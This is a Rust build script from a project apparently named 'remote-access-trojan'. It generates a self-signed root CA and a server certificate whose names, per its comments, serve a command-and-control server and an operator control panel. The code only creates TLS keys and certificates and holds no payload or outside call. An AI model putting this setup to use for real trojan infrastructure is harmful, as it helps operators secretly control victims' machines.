use std::net::{IpAddr, Ipv4Addr};
use std::path::PathBuf;
use std::{env, fs};

use rcgen::string::Ia5String;
use rcgen::{
    BasicConstraints, Certificate, CertificateParams, CertifiedIssuer, DistinguishedName, DnType,
    IsCa, KeyIdMethod, KeyPair, SanType,
};

fn root_ca() -> CertifiedIssuer<'static, KeyPair> {
    let mut params = CertificateParams::default();

    params.distinguished_name = DistinguishedName::new();
    params
        .distinguished_name
        .push(DnType::CommonName, "RAT Root CA");
    params.distinguished_name.push(
        DnType::OrganizationName,
        "Serious-senpai/remote-access-trojan",
    );
    params.is_ca = IsCa::Ca(BasicConstraints::Unconstrained);
    params.key_identifier_method = KeyIdMethod::Sha512;

    let key_pair = KeyPair::generate().unwrap();

    CertifiedIssuer::self_signed(params, key_pair).unwrap()
}

fn server_cert(root: &CertifiedIssuer<'static, KeyPair>) -> (Certificate, KeyPair) {
    let mut params = CertificateParams::default();
    params.subject_alt_names = vec![
        SanType::DnsName(Ia5String::try_from("rat-server").unwrap()), // For C&C server
        SanType::DnsName(Ia5String::try_from("localhost").unwrap()),  // For operator control panel
        SanType::IpAddress(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))),  // For operator control panel
    ];
    params
        .distinguished_name
        .push(DnType::CommonName, "rat-server");
    params.is_ca = IsCa::NoCa;

    let server_key = KeyPair::generate().unwrap();
    (params.signed_by(&server_key, root).unwrap(), server_key)
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let rat_client = PathBuf::from(env::var("CARGO_MANIFEST_DIR").unwrap());
    let repository = rat_client.parent().unwrap();

    let certs = repository.join("certs");
    fs::create_dir_all(&certs).unwrap();

    let root_crt = certs.join("root.crt");
    let root_key = certs.join("root.key");
    let server_crt = certs.join("server.crt");
    let server_key = certs.join("server.key");

    if root_crt.is_file() && root_key.is_file() && server_crt.is_file() && server_key.is_file() {
        // Skip key generation. Do not overwrite existing keys.
        return Ok(());
    }

    let root = root_ca();
    fs::write(root_crt, root.pem()).unwrap();
    fs::write(root_key, root.key().serialize_pem()).unwrap();

    let (server, key) = server_cert(&root);
    fs::write(server_crt, server.pem()).unwrap();
    fs::write(server_key, key.serialize_pem()).unwrap();

    Ok(())
}
